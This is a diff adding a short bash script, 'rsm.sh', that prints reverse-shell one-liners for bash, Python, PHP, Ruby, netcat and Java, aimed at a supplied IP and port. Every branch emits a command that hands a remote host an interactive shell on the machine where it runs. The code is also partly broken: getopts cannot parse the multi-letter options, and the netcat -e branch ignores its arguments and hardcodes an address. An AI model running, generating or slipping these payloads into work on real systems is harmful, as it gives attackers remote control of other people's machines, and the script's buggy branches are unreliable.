@@ -1,0 +1,62 @@
+#!/usr/bin/bash
+
+
+help(){
+
+	echo "usage : rsm.sh <option> <ip> <port>"
+
+	
+	echo "-h : display this help"
+	echo "-b : bash "
+	echo "-p :python"
+	echo "-ph : php"
+	echo "-r : ruby"
+	echo "-n : netcat(where -e is not available on the remote system)"
+	echo "-nc : netcat(where -e is available)"
+	echo "-j : java"
+
+}
+if [ $1 = '-h' ]
+then
+	help
+	exit 1
+fi
+
+while getopts "h:b:p:j:p:ph:r:n:nc:" option; do
+   if [ $2 ]
+   then
+	   ip=$2;
+   fi
+   if [ $3 ]
+   then
+	   port=$3;
+   fi
+   case $option in
+      b) #bash reverse shell
+         echo " bash -i >& /dev/tcp/$ip/$port 0>&1"
+         exit;;
+      p) #python reverse shell
+         echo " python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+         exit;;
+   	  ph) #php reverse shell
+		 echo "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
+		 exit;;
+	  r) #ruby reverse shell
+		  echo "ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'";
+		  exit;;
+	  n) #netcat shell when there is no -e
+		  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
+	 	  exit;;
+	  nc) # netcat with e option
+		  echo "nc -e /bin/sh 10.0.0.1 1234"
+		  exit;;
+	  j)
+		  echo "r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$ip/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]) p.waitFor()"
+		  exit;;
+	  \?)  echo "no valid option specified"
+		  exit;;
+	  
+
+   esac
+done
+
